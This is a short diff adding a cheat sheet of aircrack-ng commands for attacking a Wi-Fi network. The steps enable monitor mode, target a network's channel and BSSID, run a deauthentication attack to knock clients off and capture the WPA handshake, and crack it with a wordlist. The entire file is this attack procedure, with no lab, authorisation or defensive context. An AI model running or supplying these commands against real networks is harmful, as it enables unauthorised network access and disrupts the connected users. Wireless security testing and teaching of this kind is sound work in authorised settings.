@@ -1,0 +1,14 @@
+# Enable monitor mode
+airmon-ng start wlan0
+
+# Capture target network
+airodump-ng wlan0mon
+
+# Focus on specific network
+airodump-ng -c <CHANNEL> --bssid <BSSID> -w capture wlan0mon
+
+# Deauthentication attack
+aireplay-ng --deauth 10 -a <BSSID> wlan0mon
+
+# Crack handshake
+aircrack-ng capture.cap -w wordlist.txt
